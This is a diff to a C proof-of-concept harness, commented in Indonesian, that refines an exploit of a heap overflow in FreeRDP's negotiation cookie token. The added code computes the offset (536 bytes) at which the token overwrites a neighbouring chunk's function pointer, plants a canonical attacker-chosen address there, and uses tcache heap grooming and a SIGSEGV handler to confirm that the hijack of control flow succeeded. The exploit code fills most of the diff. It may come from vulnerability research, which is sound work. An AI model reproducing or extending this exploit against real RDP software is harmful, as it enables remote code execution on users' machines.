@@ -36,6 +36,12 @@
 #define TOKEN_LEN 600
 #define STREAM_CHUNK 512
 #define CHUNK_HDR 16 /* glibc: prev_size + size, sebelum payload chunk berikutnya */
+/* Alamat target harus KANONIK: alamat non-kanonik membuat CPU melempar #GP, dan kernel melaporkan
+ * si_addr = 0 (bukan nilai kita) sehingga bukti "pc = pilihan penyerang" jadi kabur. */
+#define TARGET_ADDR 0x0000414141414141ULL
+/* offset di dalam token yang mendarat di field `fn` korban:
+ * payload A (512) + header chunk B (16) + canary (8) = 536 */
+#define FN_OFFSET 536
 
 typedef struct
 {
@@ -57,22 +63,23 @@ static void segv_handler(int sig, siginfo_t* si, void* ctx)
 {
 	(void)sig;
 	(void)ctx;
-	const unsigned long long want = 0x4141414141414141ULL;
+	const unsigned long long want = TARGET_ADDR;
 	const unsigned long long got = (unsigned long long)(uintptr_t)si->si_addr;
-	char buf[256];
+	char buf[320];
 	int n = snprintf(buf, sizeof(buf),
 	                 "  SINYAL %d: alamat fault = 0x%016llx (diinginkan 0x%016llx)\n", sig, got, want);
 	if (n > 0)
 		(void)!write(1, buf, (size_t)n);
 	if (got == want)
 	{
-		const char* ok = "  HIJACK TERBUKTI: kendali alur eksekusi diambil alih (pc = pola token)\n"
-		                 "VERDICT: TERBUKTI — overflow menjadi control-flow hijack\n";
+		const char* ok =
+		    "  HIJACK TERBUKTI: pc diarahkan ke nilai yang kita tulis di token (bukan alamat valid)\n"
+		    "VERDICT: TERBUKTI — overflow menjadi control-flow hijack\n";
 		(void)!write(1, ok, strlen(ok));
 		_exit(0);
 	}
 	{
-		const char* no = "VERDICT: BELUM TERBUKTI — fault bukan di alamat pola\n";
+		const char* no = "VERDICT: BELUM TERBUKTI — fault bukan di alamat yang kita pilih\n";
 		(void)!write(1, no, strlen(no));
 		_exit(1);
 	}
@@ -96,6 +103,9 @@ int main(void)
 		return 3;
 	memset(token, 0x41, TOKEN_LEN); /* pola yang akan menimpa tetangga */
 	memcpy(token, "Cookie: mstshash=poc\r\n", 22);
+	/* alamat target kanonik ditempatkan tepat di field `fn` korban (token[536..543]) */
+	const unsigned long long target = TARGET_ADDR;
+	memcpy(token + FN_OFFSET, &target, sizeof(target));
 
 	freerdp* instance = freerdp_new();
 	if (!instance)
@@ -150,6 +160,8 @@ int main(void)
 	g_victim = B;
 
 	printf("harness rantai — overflow nego → control-flow hijack\n");
+	printf("  target kanonik=0x%016llx dipasang di token[%d] (kanonik: %s)\n", TARGET_ADDR, FN_OFFSET,
+	       ((TARGET_ADDR >> 47) == 0 || (TARGET_ADDR >> 47) == 0x1FFFF) ? "ya" : "TIDAK");
 	printf("  grooming: pasangan #%d A=%p B=%p selisih=%ld (payload + header = %d)\n", found, (void*)A,
 	       (void*)B, (long)((unsigned char*)B - A), STREAM_CHUNK + CHUNK_HDR);
 	free(A); /* terakhir dibebaskan → di kepala tcache untuk kelas 512 */
@@ -172,7 +184,11 @@ int main(void)
 		printf("  [x] pointer korban TIDAK tertimpa — bukti hijack tak bisa diklaim\n");
 		return 1;
 	}
-	printf("  korban tertimpa (fn != target_fn) → memanggil pointer itu sekarang\n");
+	if ((unsigned long long)(uintptr_t)B->fn != TARGET_ADDR)
+		printf("  [!] pointer tertimpa tapi BUKAN alamat yang kita pasang (0x%016llx)\n",
+		       (unsigned long long)(uintptr_t)B->fn);
+	else
+		printf("  korban tertimpa dengan alamat pilihan kita → memanggil pointer itu sekarang\n");
 	fflush(stdout);
 
 	/* --- 3. HIJACK (handler SIGSEGV di atas yang menilai) --- */
